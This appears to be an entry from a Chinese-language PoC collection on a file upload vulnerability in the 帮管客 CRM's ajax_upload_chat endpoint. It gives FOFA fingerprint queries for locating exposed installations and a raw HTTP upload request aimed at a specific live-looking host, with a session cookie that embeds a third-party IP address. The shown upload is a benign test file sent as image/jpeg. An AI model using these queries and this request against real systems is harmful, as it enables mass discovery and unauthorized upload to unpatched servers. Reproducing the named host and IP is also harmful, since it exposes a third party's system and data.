# 帮管客 CRM ajax_upload_chat 文件上传漏洞

    ## fofa

```
(title="用户登录" && body="/themes/default/js/jquery.code.js") || header="Set-Cookie: bgk_session=a%3A5" || body="<p id=\"admintips\" >初始账号：admin" || banner="Set-Cookie: bgk_session=a%3A5"

product="帮管客-CRM"
```

## Poc

```null
POST /index.php/upload/ajax_upload_chat?type=image HTTP/1.1
Host: zrd.houdezg.com:1026
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP85wZUzxCEb9PRNl
Cookie: bgk_session=bgk_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%2270edc36351739620753a2beeca7681a8%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%2282.156.29.211%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A119%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_14_3%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F12.0.3+Safari%2F605.1.15%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1691549409%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D893b1adbc9cfecf3f5a77a0581ffc946adf90933;
Accept-Encoding: gzip
Content-Length: 184

------WebKitFormBoundaryP85wZUzxCEb9PRNl
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: image/jpeg

test
------WebKitFormBoundaryP85wZUzxCEb9PRNl--
```

![](https://forum.ywhack.com/attachments/month_2207/22072122108cc5b8d1b1325848.png#alt=)
